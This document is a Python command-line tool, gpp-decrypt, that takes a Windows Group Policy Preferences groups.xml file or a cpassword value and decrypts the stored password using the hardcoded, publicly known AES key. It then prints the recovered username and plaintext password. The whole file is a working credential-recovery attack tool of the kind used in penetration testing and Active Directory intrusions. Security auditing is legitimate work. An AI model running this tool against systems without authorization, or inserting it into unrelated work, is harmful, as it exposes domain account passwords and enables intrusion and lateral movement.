#!/usr/bin/env python3
import argparse
import base64
import os
from xml.etree import ElementTree

from Crypto.Cipher import AES
from colorama import Fore, Style

banner = '''
                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         
'''

success = Style.BRIGHT + '[ ' + Fore.GREEN + '*' + Fore.RESET + ' ] ' + Style.RESET_ALL
failure = Style.BRIGHT + '[ ' + Fore.RED + '-' + Fore.RESET + ' ] ' + Style.RESET_ALL


def decrypt(cpass):
    padding = '=' * (4 - len(cpass) % 4)
    epass = cpass + padding
    decoded = base64.b64decode(epass)
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    iv = '\x00' * 16
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(decoded).decode(encoding='ascii').strip()


def main():
    usage = 'python3 gpp-decrypt.py -f [groups.xml]'
    description = 'Command-line program for decrypting Group Policy Preferences. Version 1.0'
    parser = argparse.ArgumentParser(usage=usage, description=description)
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', '--file', action='store', dest='file', help='specifies the groups.xml file')
    group.add_argument('-c', '--cpassword', action='store', dest='cpassword', help='specifies the cpassword')

    options = parser.parse_args()

    if options.file is not None:
        if not os.path.isfile(options.file):
            print(failure + 'Sorry, file not found!')
            exit(1)

        with open(options.file, 'r') as f:
            tree = ElementTree.parse(f)

        user = tree.find('User')
        if user is not None:
            print(success + 'Username: ' + user.attrib.get('name'))
        else:
            print(failure + 'Username not found!')
        properties = user.find('Properties')
        cpass = properties.attrib.get('cpassword')
        if cpass is not None:
            print(success + 'Password: ' + decrypt(cpass))
        else:
            print(failure + 'Password not found!')
    elif options.cpassword is not None:
        print(success + 'Password: ' + decrypt(options.cpassword))


if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    main()
